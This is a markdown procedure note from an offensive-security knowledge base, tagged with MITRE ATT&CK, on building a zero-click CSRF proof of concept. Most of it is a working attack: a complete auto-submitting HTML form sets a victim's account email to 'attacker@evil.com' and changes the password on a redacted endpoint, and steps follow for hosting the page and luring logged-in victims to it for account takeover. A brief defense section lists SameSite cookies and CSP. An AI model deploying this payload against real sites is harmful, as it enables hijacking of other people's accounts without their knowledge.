---
id: proc-create-html-poc-csrf-1624421
tags:
  - csrf
  - poc
  - 0-click
  - html-exploit
  - web
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T17:33:06.740Z'
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Create 0-Click HTML PoC for CSRF Attack

## Summary

This procedure generates an HTML proof-of-concept that automatically submits a forged CSRF request to the user account endpoint, enabling 0-click account takeover by changing victim email or password.

## Description

Building on the identified CSRF flaw, this PoC uses an auto-submitting form to target https://█████/user/account with form-urlencoded data. The attack scenario involves hosting the HTML on an attacker-controlled site and tricking victims into visiting it (e.g., via email link), resulting in immediate unauthorized changes without user interaction.

## Requirements

1. Text editor for HTML creation
2. Web server to host the PoC (local or remote)
3. Victim's session cookie (implicit via browser)
4. Browsers for testing (Chrome, Firefox)

## Defense

Defensive measures and detection strategies:

- Deploy SameSite cookies to mitigate CSRF
- Educate users on phishing avoidance
- Scan for and block auto-submitting forms via CSP

## Objectives

1. Automate the CSRF exploitation for realism
2. Demonstrate impact on victim accounts
3. Validate cross-browser functionality

## Instructions

### Step 1: Craft the HTML Form

**Context**: Build the auto-submit form with target endpoint and payload.

Create an HTML file with:

```html
<!DOCTYPE html>
<html>
<body>
<form id="csrf" action="https://█████/user/account" method="POST">
<input type="hidden" name="email" value="attacker@evil.com">
<input type="hidden" name="password" value="newpassword123">
</form>
<script>document.getElementById('csrf').submit();</script>
</body>
</html>
```

### Step 2: Host and Test PoC

**Context**: Deploy and verify the exploit.

Host the file on a server, visit in a logged-in browser session, and confirm the update occurs automatically. Test on Chrome and Firefox.

**Expected Output**: Victim account updated with new email/password upon page load.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[csrf]]
- [[poc]]
